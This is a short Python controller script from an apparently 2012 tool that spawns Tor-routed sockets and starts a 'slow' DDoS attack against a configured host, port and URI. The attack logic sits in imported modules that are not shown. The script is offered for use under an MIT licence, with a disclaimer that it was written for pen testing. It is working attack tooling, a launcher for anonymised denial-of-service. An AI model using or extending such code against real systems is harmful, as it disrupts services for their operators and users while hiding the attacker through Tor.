"""
    Author: Andres Andreu
    Company: neuroFuzz, LLC
    Date: 10/12/2012
    Controller prog that spawns off the tor sockets via
    the SocketController class and kicks off the actual
    DDoS process leveraging those sockets.

    MIT-LICENSE
    Copyright (c) 2012 Andres Andreu, neuroFuzz LLC
    
    Permission is hereby granted, free of charge, to any person obtaining a
    copy of this software and associated documentation files (the "Software"),
    to deal in the Software without restriction, including without limitation
    the rights to use, copy, modify, merge, publish, distribute, sublicense,
    and/or sell copies of the Software, and to permit persons to whom the
    Software is furnished to do so, subject to the following conditions:
    
    The above copyright notice and this permission notice shall be included
    in all copies or substantial portions of the Software.
    
    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
    EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
    OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
    NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
    HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
    WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
    DEALINGS IN THE SOFTWARE.
    
    If you use this for criminal purposes and get caught you are on
    your own and I am not liable. I wrote this for legit pen testing
    purposes.
    
    Be kewl and give credit where it is due if you use this. Also,
    send me feedback as I don't have the bandwidth to test for every
    condition.   
"""
from libs import slow_ddos_tor, SocketController
from vars import slow_ddos_tor_vars

sc = SocketController.SocketController()
sc.spawnSockets()

slow_ddos_tor.kickOff(host=slow_ddos_tor_vars.getHost(),
                      port=slow_ddos_tor_vars.getPort(),
                      uri=slow_ddos_tor_vars.getUri(),
                      plist=sc.getPortList())
